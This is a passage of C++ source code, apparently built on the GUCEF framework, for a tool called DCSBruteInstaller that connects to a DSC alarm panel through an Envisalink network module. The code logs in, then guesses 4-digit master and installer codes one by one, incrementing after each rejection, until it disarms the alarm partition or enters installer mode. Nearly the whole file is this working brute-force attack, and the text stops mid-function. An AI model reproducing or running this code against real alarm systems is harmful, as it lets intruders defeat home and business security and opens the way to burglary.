/*
 *  DCSBruteInstaller: Brute force code breaker for DCS alarm panel
 *
 *  This library is free software; you can redistribute it and/or
 *  modify it under the terms of the GNU Lesser General Public
 *  License as published by the Free Software Foundation; either
 *  version 2.1 of the License, or (at your option) any later version.
 *
 *  This library is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
 *  Lesser General Public License for more details.
 *
 *  You should have received a copy of the GNU Lesser General Public
 *  License along with this library; if not, write to the Free Software
 *  Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307 USA
 */

/*-------------------------------------------------------------------------//
//                                                                         //
//      INCLUDES                                                           //
//                                                                         //
//-------------------------------------------------------------------------*/

#ifndef GUCEF_MT_DVMTOSWRAP_H
#include "gucefMT_dvmtoswrap.h"
#define GUCEF_MT_DVMTOSWRAP_H
#endif /* GUCEF_MT_DVMTOSWRAP_H ? */

#ifndef GUCEF_CORE_DVCPPFILEUTILS_H
#include "dvcppfileutils.h"
#define GUCEF_CORE_DVCPPFILEUTILS_H
#endif /* GUCEF_CORE_DVCPPFILEUTILS_H ? */

#ifndef GUCEF_CORE_CGUCEFAPPLICATION_H
#include "CGUCEFApplication.h"
#define GUCEF_CORE_CGUCEFAPPLICATION_H
#endif /* GUCEF_CORE_CGUCEFAPPLICATION_H ? */

#ifndef GUCEF_CORE_CCOREGLOBAL_H
#include "gucefCORE_CCoreGlobal.h"
#define GUCEF_CORE_CCOREGLOBAL_H
#endif /* GUCEF_CORE_CCOREGLOBAL_H ? */

#ifndef GUCEF_CORE_LOGGING_H
#include "gucefCORE_Logging.h"
#define GUCEF_CORE_LOGGING_H
#endif /* GUCEF_CORE_LOGGING_H ? */

#ifndef GUCEF_CORE_CDATANODE_H
#include "CDataNode.h"
#define GUCEF_CORE_CDATANODE_H
#endif /* GUCEF_CORE_CDATANODE_H ? */

#ifndef GUCEF_CORE_DVCPPSTRINGUTILS_H
#include "dvcppstringutils.h"
#define GUCEF_CORE_DVCPPSTRINGUTILS_H
#endif /* GUCEF_CORE_DVCPPSTRINGUTILS_H ? */

#ifndef GUCEF_CORE_CGLOBALCONFIGVALUELIST_H
#include "gucefCORE_CGlobalConfigValueList.h"
#define GUCEF_CORE_CGLOBALCONFIGVALUELIST_H
#endif /* GUCEF_CORE_CGLOBALCONFIGVALUELIST_H ? */

#ifndef GUCEF_CORE_DVCPPOSWRAP_H
#include "DVCPPOSWRAP.h"
#define GUCEF_CORE_DVCPPOSWRAP_H
#endif /* GUCEF_CORE_DVCPPOSWRAP_H ? */

#ifndef GUCEF_CORE_CFILEACCESS_H
#include "CFileAccess.h"
#define GUCEF_CORE_CFILEACCESS_H
#endif /* GUCEF_CORE_CFILEACCESS_H ? */

#ifndef GUCEF_CORE_CONFIGSTORE_H
#include "CConfigStore.h"
#define GUCEF_CORE_CONFIGSTORE_H
#endif /* GUCEF_CORE_CONFIGSTORE_H ? */

#ifndef GUCEF_CORE_CPLATFORMNATIVECONSOLEWINDOW_H
#include "gucefCORE_CPlatformNativeConsoleWindow.h"
#define GUCEF_CORE_CPLATFORMNATIVECONSOLEWINDOW_H
#endif /* GUCEF_CORE_CPLATFORMNATIVECONSOLEWINDOW_H ? */

#ifndef GUCEF_CORE_CVALUELIST_H
#include "CValueList.h"
#define GUCEF_CORE_CVALUELIST_H
#endif /* GUCEF_CORE_CVALUELIST_H ? */

#ifndef GUCEF_CORE_CTIMER_H
#include "CTimer.h"
#define GUCEF_CORE_CTIMER_H
#endif /* GUCEF_CORE_CTIMER_H ? */

#ifndef GUCEF_COMCORE_CTCPCLIENTSOCKET_H
#include "CTCPClientSocket.h"
#define GUCEF_COMCORE_CTCPCLIENTSOCKET_H
#endif /* GUCEF_COMCORE_CTCPCLIENTSOCKET_H ? */

#ifndef GUCEF_COMCORE_CCOMCOREGLOBAL_H
#include "gucefCOMCORE_CComCoreGlobal.h"
#define GUCEF_COMCORE_CCOMCOREGLOBAL_H
#endif /* GUCEF_COMCORE_CCOMCOREGLOBAL_H ? */

/*-------------------------------------------------------------------------//
//                                                                         //
//      NAMESPACE                                                          //
//                                                                         //
//-------------------------------------------------------------------------*/

using namespace GUCEF;

/*-------------------------------------------------------------------------//
//                                                                         //
//      MACROS                                                             //
//                                                                         //
//-------------------------------------------------------------------------*/

#define HI_NIBBLE(b) (((b) >> 4) & 0x0F)
#define LO_NIBBLE(b) ((b) & 0x0F)

/*-------------------------------------------------------------------------//
//                                                                         //
//      UTILITIES                                                          //
//                                                                         //
//-------------------------------------------------------------------------*/

class DCSBruteInstaller : public CORE::CObserver
{
    private:

    typedef CORE::CTEventHandlerFunctor< DCSBruteInstaller > TEventCallback;
    typedef CORE::CString::StringVector                      TStringVector;

    enum EAttackType
    {
        ATTACKTYPE_NONE =      0 ,
        ATTACKTYPE_USER =      1 ,
        ATTACKTYPE_INSTALLER = 2
    };
    typedef enum EAttackType TAttackType;

    COMCORE::CHostAddress m_envisalinkAddr;
    COMCORE::CTCPClientSocket m_tcpClientSocket;
    CORE::CString m_password;
    CORE::UInt16 m_installerCode;
    CORE::UInt16 m_masterCode;
    TStringVector m_msgQueue;
    bool m_requestSystemInfo;
    bool m_sendIndividualKeystrokes;
    bool m_ackReceivedForLastSend;
    TAttackType m_currentAttack;
    bool m_attackInstaller;
    bool m_attackUser;

    public:

    static CORE::CString
    TrimLeadingZeros( const CORE::CString& hex )
    {
        if ( hex.IsNULLOrEmpty() ) return "0";

        CORE::UInt32 i=0;
        while ( '0' == hex[ i ] ) ++i;

        if ( i+1 < hex.Length() )
        {
            return hex.C_String()+i;
        }
        return "0";
    }

    static CORE::CString
    AppendChecksumAndCrLf( const CORE::CString& msg )
    {GUCEF_TRACE;

        // Add every ASCII hex value as a decimal, allow overflow of byte
        // the total value is decimal since we convert to decimal before addition
        CORE::UInt8 checksum = 0;
        for ( CORE::UInt32 i=0; i<msg.Length(); ++i )
        {
            checksum += (CORE::UInt8) msg[ i ];
        }

        // grab the high and low nibble while still in decimal
        CORE::UInt8 hiChecksumNibble = HI_NIBBLE( checksum );
        CORE::UInt8 loChecksumNibble = LO_NIBBLE( checksum );

        hiChecksumNibble = TrimLeadingZeros( CORE::ConvertBytesToHexString( &hiChecksumNibble, 1, false, false ) )[ 0 ];
        loChecksumNibble = TrimLeadingZeros( CORE::ConvertBytesToHexString( &loChecksumNibble, 1, false, false ) )[ 0 ];

        char suffix[ 4 ] = { (char) hiChecksumNibble, (char) loChecksumNibble, '\r', '\n' };
        CORE::CString newMsg( msg );
        newMsg.Append( suffix, 4 );

        return newMsg;
    }

    void
    OnTCPSocketDisconnected( CORE::CNotifier* notifier    ,
                             const CORE::CEvent& eventID  ,
                             CORE::CICloneable* eventData )
    {GUCEF_TRACE;

        GUCEF_LOG( CORE::LOGLEVEL_IMPORTANT, "DCSBruteInstaller: TCP Socket disconnected" );

        CORE::CCoreGlobal::Instance()->GetApplication().Stop();
    }

    void
    OnTCPSocketConnecting( CORE::CNotifier* notifier    ,
                           const CORE::CEvent& eventID  ,
                           CORE::CICloneable* eventData )
    {GUCEF_TRACE;

        GUCEF_LOG( CORE::LOGLEVEL_IMPORTANT, "DCSBruteInstaller: TCP Socket connecting" );
    }

    void
    OnTCPSocketDataSentEvent( CORE::CNotifier* notifier    ,
                              const CORE::CEvent& eventID  ,
                              CORE::CICloneable* eventData )
    {GUCEF_TRACE;

        if ( 0 == eventData ) return;

        COMCORE::CTCPClientSocket::TDataSentEventData* eData = static_cast< COMCORE::CTCPClientSocket::TDataRecievedEventData* >( eventData );
        const CORE::CDynamicBuffer& buffer = eData->GetData();

        GUCEF_LOG( CORE::LOGLEVEL_BELOW_NORMAL, "DCSBruteInstaller: TCP Socket data sent: " + CORE::UInt32ToString( buffer.GetDataSize() ) + " bytes" );
    }

    bool SendMessage( const CORE::CString& msg )
    {
        CORE::CString checkSummedMsg = AppendChecksumAndCrLf( msg );
        return m_tcpClientSocket.SendString( checkSummedMsg );
    }

    void QueueMessage( const CORE::CString& msg )
    {
        CORE::CString checkSummedMsg = AppendChecksumAndCrLf( msg );
        m_msgQueue.push_back( checkSummedMsg );
    }

    bool SendQueuedMessage( void )
    {
        if ( !m_msgQueue.empty() )
        {
            if ( m_ackReceivedForLastSend )
            {
                if ( m_tcpClientSocket.SendString( m_msgQueue.front() ) )
                {
                    m_ackReceivedForLastSend = false;
                    GUCEF_LOG( CORE::LOGLEVEL_IMPORTANT, "DCSBruteInstaller: Sent queued message: " + m_msgQueue.front() );
                    MT::ThreadDelay( 10 );
                    //m_msgQueue.erase( m_msgQueue.begin() );
                    return true;
                }
                GUCEF_ERROR_LOG( CORE::LOGLEVEL_IMPORTANT, "DCSBruteInstaller: Failed to send queued message: " + m_msgQueue.front() );
                return false;
            }
            else
            {
                GUCEF_DEBUG_LOG( CORE::LOGLEVEL_NORMAL, "DCSBruteInstaller: Skipping send since ack has not yet been received for last message we sent" );
                return true;
            }
        }

        GUCEF_DEBUG_LOG( CORE::LOGLEVEL_NORMAL, "DCSBruteInstaller: There are no messages queued to be sent" );
        return true;
    }

    void EraseQueuedMessage( void )
    {
        if ( !m_msgQueue.empty() )
        {
            m_msgQueue.erase( m_msgQueue.begin() );
        }
    }

    static CORE::CString
    CommandToString( CORE::UInt16 command )
    {GUCEF_TRACE;

        if ( command < 10 )
        {
            return "00" + CORE::UInt16ToString( command );
        }
        if ( command < 100 )
        {
            return '0' + CORE::UInt16ToString( command );
        }
        return CORE::UInt16ToString( command );
    }

    void SendAuthentication( void )
    {GUCEF_TRACE;

        // We need authenticate within 10 seconds
        CORE::CString msg = "005" + m_password;
        if ( SendMessage( msg ) )
        {
            GUCEF_LOG( CORE::LOGLEVEL_IMPORTANT, "DCSBruteInstaller: Sent authentication msg" );
        }
        else
        {
            GUCEF_ERROR_LOG( CORE::LOGLEVEL_IMPORTANT, "DCSBruteInstaller: Failed to send authentication" );
        }
    }

    static CORE::CString
    PassCodeToString( CORE::UInt16 passCode )
    {
        CORE::CString codeStr = CORE::UInt16ToString( passCode );
        if ( passCode < 10 )
        {
            return "000" + codeStr;
        }
        else
        if ( passCode < 100 )
        {
            return "00" + codeStr;
        }
        else
        if ( passCode < 1000 )
        {
            return "0" + codeStr;
        }
        else
        {
            return codeStr;
        }
    }

    void SendReset( void )
    {GUCEF_TRACE;

        QueueMessage( "070#" );
        GUCEF_LOG( CORE::LOGLEVEL_IMPORTANT, "DCSBruteInstaller: Queued keystroke # to signal a reset" );
        SendQueuedMessage();
    }

    void SendMasterCodeSingleStroke( void )
    {GUCEF_TRACE;

        // Prepare the master code string
        // this has the command code 071 which is multiple key presses
        // followed by *5 which means login as master user
        // followed by the 4-6 digit master code

        CORE::CString codeStr = PassCodeToString( m_masterCode );
        CORE::CString msg = "*5" + codeStr + '#';

        for ( CORE::UInt32 i=0; i<msg.Length(); ++i )
        {
            CORE::CString keyStrokeMsg( "070" );
            keyStrokeMsg += msg[ i ];

            QueueMessage( keyStrokeMsg );
            GUCEF_LOG( CORE::LOGLEVEL_IMPORTANT, "DCSBruteInstaller: Queued keystroke " + CORE::CString( msg[i] ) + " for master login with code " + codeStr );
        }

        if ( SendQueuedMessage() )
        {
            GUCEF_LOG( CORE::LOGLEVEL_IMPORTANT, "DCSBruteInstaller: Starting to send keystrokes for master login with code " + codeStr );
        }
        else
        {
            GUCEF_ERROR_LOG( CORE::LOGLEVEL_IMPORTANT, "DCSBruteInstaller: Failed to send first keystroke for master login with code " + codeStr );
        }
    }

    void SendMasterCode( void )
    {GUCEF_TRACE;

        if ( m_sendIndividualKeystrokes )
        {
            SendMasterCodeSingleStroke();
        }
        else
        {
            // Prepare the master code string
            // this has the command code 071 which is multiple key presses
            // followed by *5 which means login as master user
            // followed by the 4-6 digit master code

            CORE::CString codeStr = PassCodeToString( m_masterCode );
            CORE::CString msg = "071*5" + codeStr + '#';

            QueueMessage( msg );
            GUCEF_LOG( CORE::LOGLEVEL_IMPORTANT, "DCSBruteInstaller: Queued master login with code " + codeStr );
            SendQueuedMessage();
        }
    }

    void SendPartitionDisarm( CORE::UInt16 partition = 1 )
    {
        CORE::CString codeStr = PassCodeToString( m_masterCode );
        CORE::CString partStr = CORE::UInt16ToString( partition );
        CORE::CString msg = "040" + CORE::UInt16ToString( partition ) + codeStr;

        QueueMessage( msg );

        GUCEF_LOG( CORE::LOGLEVEL_IMPORTANT, "DCSBruteInstaller: Sending Partition Disarm for partition " + partStr + " with code " + codeStr );
        SendQueuedMessage();
    }

    void SendInstallerCodeSingleStroke( void )
    {GUCEF_TRACE;

        // Prepare the installer code string
        // this has the command code 071 which is multiple key presses
        // followed by *8 which means login as installer
        // followed by the 4-6 digit installer code

        CORE::CString codeStr = PassCodeToString( m_installerCode );
        CORE::CString msg = "*8" + codeStr + '#';

        for ( CORE::UInt32 i=0; i<msg.Length(); ++i )
        {
            CORE::CString keyStrokeMsg( "070" );
            keyStrokeMsg += msg[ i ];

            QueueMessage( keyStrokeMsg );
            GUCEF_LOG( CORE::LOGLEVEL_IMPORTANT, "DCSBruteInstaller: Queued keystroke " + CORE::CString( msg[i] ) + " for installer login with code " + codeStr );
        }

        if ( SendQueuedMessage() )
        {
            GUCEF_LOG( CORE::LOGLEVEL_IMPORTANT, "DCSBruteInstaller: Starting to send keystrokes for installer login with code " + codeStr );
        }
        else
        {
            GUCEF_ERROR_LOG( CORE::LOGLEVEL_IMPORTANT, "DCSBruteInstaller: Failed to send first keystroke for installer login with code " + codeStr );
        }
    }

    void SendInstallerCode( void )
    {GUCEF_TRACE;

        if ( m_sendIndividualKeystrokes )
        {
            SendInstallerCodeSingleStroke();
        }
        else
        {
            // Prepare the installer code string
            // this has the command code 071 which is multiple key presses
            // followed by *8 which means login as installer
            // followed by the 4 digit installer code

            CORE::CString codeStr = PassCodeToString( m_installerCode );
            CORE::CString msg = "071*8" + codeStr + '#';

            QueueMessage( msg );
            GUCEF_LOG( CORE::LOGLEVEL_IMPORTANT, "DCSBruteInstaller: Queued installer login with code " + codeStr );
            SendQueuedMessage();
        }
    }

    void SendStatusReportRequest( void )
    {
        QueueMessage( "000" );
        QueueMessage( "001" );
        QueueMessage( "008" );
        GUCEF_LOG( CORE::LOGLEVEL_IMPORTANT, "DCSBruteInstaller: Queued requests for system information for diagnostic purposes" );
        SendQueuedMessage();
    }

    void ParseZoneTimerDump( const CORE::CString& hexMsg )
    {
        for ( CORE::UInt32 i=0; i<64; ++i )
        {
            CORE::CString hexTimerValue = hexMsg.SubstrFromRange( 4*i, (4*i)+4 );
            if ( "FFFF" == hexTimerValue )
            {
                GUCEF_LOG( CORE::LOGLEVEL_IMPORTANT, "DCSBruteInstaller: Zone " + CORE::UInt32ToString( i ) + " has timer value " + hexTimerValue + " indicating the zone is open" );
            }
            else
            if ( "0000" == hexTimerValue )
            {
                GUCEF_LOG( CORE::LOGLEVEL_IMPORTANT, "DCSBruteInstaller: Zone " + CORE::UInt32ToString( i ) + " has timer value " + hexTimerValue + " indicating the zone is closed too long ago to remember" );
            }
            else
            {
                CORE::CString flippedNibbleStr = hexTimerValue.SubstrFromRange( 2, 4 ) + hexTimerValue.SubstrFromRange( 0, 2 );
                CORE::UInt32 timerValue = 0;
                sscanf( flippedNibbleStr.C_String(), "%x", &timerValue);

                GUCEF_LOG( CORE::LOGLEVEL_IMPORTANT, "DCSBruteInstaller: Zone " + CORE::UInt32ToString( i ) + " has timer value " + hexTimerValue + " which is " + CORE::UInt32ToString( timerValue*5 ) + " seconds" );
            }
        }
    }

    CORE::CString GetArmTypeString( const CORE::CString& msg )
    {
        CORE::UInt8 armTypeId = CORE::StringToUInt8( msg );
        switch ( armTypeId )
        {
            case 0 : return "AWAY";
            case 1 : return "STAY";
            case 2 : return "ZERO-ENTRY-AWAY";
            case 3 : return "ZERO-ENTRY-STAY";
            default: return "ERROR-UNSUPPORTED-TYPE";
        }
    }

    void
    OnMessageReceived( const CORE::CString& msg )
    {GUCEF_TRACE;

        GUCEF_LOG( CORE::LOGLEVEL_IMPORTANT, "DCSBruteInstaller: Received msg: " + msg );

        CORE::UInt16 command = CORE::StringToUInt16( msg.SubstrFromRange( 0, 3 ) );
        switch ( command )
        {
            case 500:
            {
                CORE::UInt16 prevCommand = CORE::StringToUInt16( msg.SubstrFromRange( 3, 6 ) );
                GUCEF_LOG( CORE::LOGLEVEL_IMPORTANT, "DCSBruteInstaller: Envisalink acknowledges command as received: " + CommandToString( prevCommand ) );

                m_ackReceivedForLastSend = true;
                EraseQueuedMessage();
                SendQueuedMessage();
                break;
            }
            case 501:
            {
                GUCEF_LOG( CORE::LOGLEVEL_IMPORTANT, "DCSBruteInstaller: Envisalink says the command we sent had a bad checksum" );
                m_ackReceivedForLastSend = true;
                SendQueuedMessage();
                break;
            }
            case 502:
            {
                CORE::CString errorStr = msg.SubstrFromRange( 3, 6 );
                GUCEF_LOG( CORE::LOGLEVEL_IMPORTANT, "DCSBruteInstaller: Envisalink says a system error occured: " + errorStr );

                CORE::UInt16 errorCode = CORE::StringToUInt16( errorStr );
                switch ( errorCode )
                {
                    case 2:
                    {
                        GUCEF_LOG( CORE::LOGLEVEL_IMPORTANT, "Envisalink error: Receive Buffer Overflow" );
                        break;
                    }
                    case 3:
                    {
                        GUCEF_LOG( CORE::LOGLEVEL_IMPORTANT, "Envisalink error: Transmit Buffer Overflow" );
                        break;
                    }
                    case 10:
                    {
                        GUCEF_LOG( CORE::LOGLEVEL_IMPORTANT, "Envisalink error: Keybus Transmit Buffer Overrun" );
                        m_ackReceivedForLastSend = true;

                        MT::ThreadDelay( 20 );
                        SendQueuedMessage();
                        break;
                    }
                    case 11:
                    {
                        GUCEF_LOG( CORE::LOGLEVEL_IMPORTANT, "Envisalink error: Keybus Transmit Time Timeout" );
                        break;
                    }
                    case 12:
                    {
                        GUCEF_LOG( CORE::LOGLEVEL_IMPORTANT, "Envisalink error: Keybus Transmit Mode Timeout" );
                        break;
                    }
                    case 13:
                    {
                        GUCEF_LOG( CORE::LOGLEVEL_IMPORTANT, "Envisalink error: Keybus Transmit Keystring Timeout" );
                        break;
                    }
                    case 14:
                    {
                        GUCEF_LOG( CORE::LOGLEVEL_IMPORTANT, "Envisalink error: Keybus Interface Not Functioning (the TPI cannot communicate with the security system)" );
                        break;
                    }
                    case 15:
                    {
                        GUCEF_LOG( CORE::LOGLEVEL_IMPORTANT, "Envisalink error: Keybus Busy (Attempting to Disarm or Arm with user code)" );
                        break;
                    }
                    case 16:
                    {
                        GUCEF_LOG( CORE::LOGLEVEL_IMPORTANT, "Envisalink error: Keybus Busy – Lockout (The panel is currently in Keypad Lockout – too many disarm attempts)" );
                        break;
                    }
                    case 17:
                    {
                        GUCEF_LOG( CORE::LOGLEVEL_IMPORTANT, "Envisalink error: Keybus Busy – Installers Mode (Panel is in installers mode, most functions are unavailable)" );
                        break;
                    }
                    case 18:
                    {
                        GUCEF_LOG( CORE::LOGLEVEL_IMPORTANT, "Envisalink error: Keybus Busy – General Busy (The requested partition is busy)" );
                        break;
                    }
                    case 20:
                    {
                        GUCEF_LOG( CORE::LOGLEVEL_IMPORTANT, "Envisalink error: API Command Syntax Error" );
                        break;
                    }
                    case 21:
                    {
                        GUCEF_LOG( CORE::LOGLEVEL_IMPORTANT, "Envisalink error: API Command Partition Error (Requested Partition is out of bounds)" );

                        //++m_installerCode;
                        //SendInstallerCode();
                        break;
                    }
                    case 22:
                    {
                        GUCEF_LOG( CORE::LOGLEVEL_IMPORTANT, "Envisalink error: API Command Not Supported" );
                        break;
                    }
                    case 23:
                    {
                        // this sometimes comes dispite the system being armed, maybe some race condition in Envisalink???
                        // managed to successfully get a code dispite this so ignore... :/
                        GUCEF_LOG( CORE::LOGLEVEL_IMPORTANT, "Envisalink error: API System Not Armed (sent in response to a disarm command)" );
                        break;
                    }
                    case 24:
                    {
                        GUCEF_LOG( CORE::LOGLEVEL_IMPORTANT, "Envisalink error: API System Not Ready to Arm (system is either not-secure, in exit-delay, or already armed)" );
                        break;
                    }
                    case 25:
                    {
                        GUCEF_LOG( CORE::LOGLEVEL_IMPORTANT, "Envisalink error: API Command Invalid Length" );
                        break;
                    }
                    case 26:
                    {
                        GUCEF_LOG( CORE::LOGLEVEL_IMPORTANT, "Envisalink error: API User Code not Required" );
                        break;
                    }
                    case 27:
                    {
                        GUCEF_LOG( CORE::LOGLEVEL_IMPORTANT, "Envisalink error: API Invalid Characters in Command (no alpha characters are allowed except for checksum)" );
                        break;
                    }
                    default :
                    {
                        break;
                    }
                }

                break;
            }
            case 505:
            {
                //Login Interaction
                //Sent during session login only.
                //3 = Request for password, sent after socket setup
                //2 = Time out. You did not send a password within 10 seconds.
                //1 = Password Correct, session established
                //0 = Password provided was incorrect
                CORE::UInt8 data = msg[ 3 ];
                switch ( data )
                {
                    case '0':
                    {
                        GUCEF_LOG( CORE::LOGLEVEL_IMPORTANT, "DCSBruteInstaller: Envisalink Password is rejected, password incorrect" );
                        break;
                    }
                    case '1':
                    {
                        GUCEF_LOG( CORE::LOGLEVEL_IMPORTANT, "DCSBruteInstaller: Envisalink Password is accepted, session established" );

                        if ( m_requestSystemInfo )
                        {
                            SendStatusReportRequest();
                        }
                        if ( m_attackUser )
                        {
                            // attack user first, if so desired we will auto-transition into an installer attack once a user code is found
                            // and the system is disarmed. The system needs to be disarmed in order to run an installer attack!
                            m_currentAttack = ATTACKTYPE_USER;
                            SendPartitionDisarm();
                        }
                        else
                        if ( m_attackInstaller )
                        {
                            m_currentAttack = ATTACKTYPE_INSTALLER;
                            SendInstallerCode();
                        }
                        else
                        {
                            m_currentAttack = ATTACKTYPE_NONE;
                        }
                        break;
                    }
                    case '2':
                    {
                        GUCEF_LOG( CORE::LOGLEVEL_IMPORTANT, "DCSBruteInstaller: Envisalink authentication timeout" );
                        break;
                    }
                    case '3':
                    {
                        GUCEF_LOG( CORE::LOGLEVEL_IMPORTANT, "DCSBruteInstaller: Envisalink Password is being requested, sending authentication" );
                        SendAuthentication();
                        break;
                    }
                    default:
                    {
                        GUCEF_LOG( CORE::LOGLEVEL_IMPORTANT, "DCSBruteInstaller: Envisalink sent unsupported data " + CORE::CString( data ) + " with a 505" );
                        break;
                    }

                }
                break;
            }
            case 510 :
            {
                GUCEF_LOG( CORE::LOGLEVEL_IMPORTANT, "DCSBruteInstaller: Envisalink reports Partition 1's KeyPad LED state " + msg.SubstrFromRange( 3, 5 ) );
                break;
            }
            case 511 :
            {
                GUCEF_LOG( CORE::LOGLEVEL_IMPORTANT, "DCSBruteInstaller: Envisalink reports Partition 1's KeyPad LED FLASH state " + msg.SubstrFromRange( 3, 5 ) );
                break;
            }
            case 601:
            {
                GUCEF_LOG( CORE::LOGLEVEL_IMPORTANT, "DCSBruteInstaller: Envisalink reports zone " + msg.SubstrFromRange( 3, 6 ) + " is in alarm condition" );
                break;
            }
            case 602:
            {
                GUCEF_LOG( CORE::LOGLEVEL_IMPORTANT, "DCSBruteInstaller: Envisalink reports zone " + msg.SubstrFromRange( 3, 6 ) + " has its alarm condition restored" );
                break;
            }
            case 603:
            {
                GUCEF_LOG( CORE::LOGLEVEL_IMPORTANT, "DCSBruteInstaller: Envisalink reports zone " + msg.SubstrFromRange( 3, 6 ) + " is has a tamper condition" );
                break;
            }
            case 604:
            {
                GUCEF_LOG( CORE::LOGLEVEL_IMPORTANT, "DCSBruteInstaller: Envisalink reports zone " + msg.SubstrFromRange( 3, 6 ) + " has its tamper condition restored" );
                break;
            }
            case 605:
            {
                GUCEF_LOG( CORE::LOGLEVEL_IMPORTANT, "DCSBruteInstaller: Envisalink reports zone " + msg.SubstrFromRange( 3, 6 ) + " is has a fault condition" );
                break;
            }
            case 606:
            {
                GUCEF_LOG( CORE::LOGLEVEL_IMPORTANT, "DCSBruteInstaller: Envisalink reports zone " + msg.SubstrFromRange( 3, 6 ) + " has its fault condition restored" );
                break;
            }
            case 609:
            {
                GUCEF_LOG( CORE::LOGLEVEL_IMPORTANT, "DCSBruteInstaller: Envisalink reports zone " + msg.SubstrFromRange( 3, 6 ) + " is OPEN" );
                break;
            }
            case 610:
            {
                GUCEF_LOG( CORE::LOGLEVEL_IMPORTANT, "DCSBruteInstaller: Envisalink reports zone " + msg.SubstrFromRange( 3, 6 ) + " is restored" );
                break;
            }
            case 615:
            {
                GUCEF_LOG( CORE::LOGLEVEL_IMPORTANT, "DCSBruteInstaller: Envisalink sent a zone timer dump" );
                ParseZoneTimerDump( msg.CutChars( 3, true ) );
                break;
            }
            case 650:
            {
                GUCEF_LOG( CORE::LOGLEVEL_IMPORTANT, "DCSBruteInstaller: Envisalink tells us partition " + msg.SubstrFromRange( 3, 4 ) + " is ready and can be armed" );
                break;
            }
            case 651:
            {
                GUCEF_LOG( CORE::LOGLEVEL_IMPORTANT, "DCSBruteInstaller: Envisalink tells us partition " + msg.SubstrFromRange( 3, 4 ) + " is not ready and cannot be armed" );
                break;
            }
            case 652:
            {
                CORE::CString partitionStr = msg.SubstrFromRange( 3, 4 );
                CORE::UInt16 partitionId = CORE::StringToUInt16( partitionStr );

                GUCEF_LOG( CORE::LOGLEVEL_IMPORTANT, "DCSBruteInstaller: Envisalink tells us partition " + partitionStr + " is armed as type " + GetArmTypeString( msg.SubstrFromRange( 4, 5 ) ) );

                m_ackReceivedForLastSend = true;
                SendQueuedMessage();
                break;
            }
            case 670:
            {
                GUCEF_LOG( CORE::LOGLEVEL_IMPORTANT, "DCSBruteInstaller: Envisalink tells us we sent an Invalid Access Code for partition " + msg.SubstrFromRange( 3, 4 ) );
                m_ackReceivedForLastSend = true;

                switch ( m_currentAttack )
                {
                    case ATTACKTYPE_INSTALLER: { ++m_installerCode; SendInstallerCode(); break; }
                    case ATTACKTYPE_USER: { ++m_masterCode; SendPartitionDisarm(); break; }
                }
                break;
            }
            case 671:
            {
                GUCEF_LOG( CORE::LOGLEVEL_IMPORTANT, "DCSBruteInstaller: Envisalink tells us Function Not Available for partition " + msg.SubstrFromRange( 3, 4 ) );
                m_ackReceivedForLastSend = true;
                break;
            }
            case 673:
            {
                GUCEF_LOG( CORE::LOGLEVEL_IMPORTANT, "DCSBruteInstaller: Envisalink tells us partition " + msg.SubstrFromRange( 3, 4 ) + " is busy (another keypad is programming or an installer is programming)" );
                m_ackReceivedForLastSend = true;
                break;
            }
            case 674:
            {
                GUCEF_LOG( CORE::LOGLEVEL_IMPORTANT, "DCSBruteInstaller: Envisalink tells us System Arming in Progress: This system is auto-arming and is in arm warning delay for partition " + msg.SubstrFromRange( 3, 4 ) );
                m_ackReceivedForLastSend = true;
                break;
            }
            case 680:
            {
                GUCEF_LOG( CORE::LOGLEVEL_CRITICAL, "DCSBruteInstaller: Envisalink reports the system is NOW IN INSTALLER MODE!!! Last code used: " + PassCodeToString( m_installerCode ) );
                m_ackReceivedForLastSend = true;

                // we have to now make sure we exit installer mode because other panels will be locked out
                // failure here could mean having to power-cycle the system
                for ( int i=0; i<5; ++i )
                {
                    QueueMessage( "070#" );
                }
                SendQueuedMessage();
                break;
            }
            case 700 :
            {
                CORE::CString partitionStr = msg.SubstrFromRange( 3, 4 );
                CORE::UInt16 partitionId = CORE::StringToUInt16( partitionStr );

                // This could mean we have found he user code for a user Id!!!
                GUCEF_LOG( CORE::LOGLEVEL_CRITICAL, "DCSBruteInstaller: Envisalink tells us User Closing, A partition has been armed by a user – sent at the end of exit delay, for partition " + partitionStr + " with userId " + msg.SubstrFromRange( 4, 8 ) + ". The current last user code was " + CORE::UInt16ToString( m_masterCode ) );
            }
            case 750 :
            {
                CORE::CString partitionStr = msg.SubstrFromRange( 3, 4 );
                CORE::UInt16 partitionId = CORE::StringToUInt16( partitionStr );

                // This could mean we have found he user code for a user Id!!!
                GUCEF_LOG( CORE::LOGLEVEL_CRITICAL, "DCSBruteInstaller: Envisalink tells us User Opening, A partition has been disarmed by a user for partition " + partitionStr + " with userId " + msg.SubstrFromRange( 4, 8 ) + ". The current last user code was " + CORE::UInt16ToString( m_masterCode ) );
                if ( m_currentAttack == ATTACKTYPE_USER )
                {
                    // We were indeed running a user code attack, not someone entering the code from a panel
                    if ( m_attackInstaller )
                    {
                        // Now that the system is disarmed we can proceed to attaking the installer code.
                        // You cannot run that attack if the system is armed so we had to get a user code first
                        m_currentAttack = ATTACKTYPE_INSTALLER;
                    }
                    else
                    {
                        // Since 1 user code is enough to disarm the system we will leave it at that
                        // with the system disarmed everything else is possible.
                        m_currentAttack = ATTACKTYPE_NONE;
                        CORE::CCoreGlobal::Instance()->GetApplication().Stop();
                    }
                }
                break;
            }
            case 751 :
            {
                CORE::CString partitionStr = msg.SubstrFromRange( 3, 4 );
                CORE::UInt16 partitionId = CORE::StringToUInt16( partitionStr );

                // This could mean we have found he user code for a user Id!!!
                GUCEF_LOG( CORE::LOGLEVEL_IMPORTANT, "DCSBruteInstaller: Envisalink tells us Special Opening, A partition has been disarmed by one of the following methods: Keyswitch, DLS software, Wireless Key for partition " + partitionStr + ". The current last user code was " + CORE::UInt16ToString( m_masterCode ) );

                break;
            }
            case 840 :
            {
                GUCEF_LOG( CORE::LOGLEVEL_IMPORTANT, "DCSBruteInstaller: Envisalink tells us trouble LED for partition " + msg.SubstrFromRange( 3, 4 ) + " is ON" );
                break;
            }
            case 841 :
            {
                GUCEF_LOG( CORE::LOGLEVEL_IMPORTANT, "DCSBruteInstaller: Envisalink tells us trouble LED for partition " + msg.SubstrFromRange( 3, 4 ) + " is OFF" );
                break;
            }
            case 849 :
            {
                GUCEF_LOG( CORE::LOGLEVEL_IMPORTANT, "DCSBruteInstaller: Envisalink tells gives us verbose trouble status " + msg.SubstrFromRange( 3, 5 ) );
                break;
            }
            case 922 :
